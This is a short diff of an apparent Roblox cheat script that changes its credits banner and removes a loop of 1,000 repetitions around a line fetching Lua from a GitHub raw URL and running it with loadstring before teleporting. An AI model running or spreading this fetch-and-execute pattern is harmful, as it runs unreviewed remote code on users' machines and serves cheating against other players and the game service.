@@ -1,6 +1,6 @@
 -- go ahead skid it idc
 
-game:GetService("StarterGui"):SetCore("SendNotification",{Title = "Credits",Text = "Made By DonjoSx, Upgraded By Nexer1234 (version: v2.6)" ,Duration = 10, Icon = "rbxthumb://type=Asset&id=9649923610&w=150&h=150",Button1 = "alright dud"})
+game:GetService("StarterGui"):SetCore("SendNotification",{Title = "Credits",Text = "Made By DonjoSx, Upgraded By Nexer1234 (version: v2.7)" ,Duration = 10, Icon = "rbxthumb://type=Asset&id=9649923610&w=150&h=150",Button1 = "alright dud"})
 
 if not game.IsLoaded then
     game.Loaded:Wait()
@@ -184,11 +184,9 @@ if target then
 wait()
     spawn(function()
 	wait(1)
-        for i = 1, 1000 do
             spawn(function()	
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/hit/main/main.lua'))()
             end)      
-        end
     end)
     wait(1)
     Teleport()
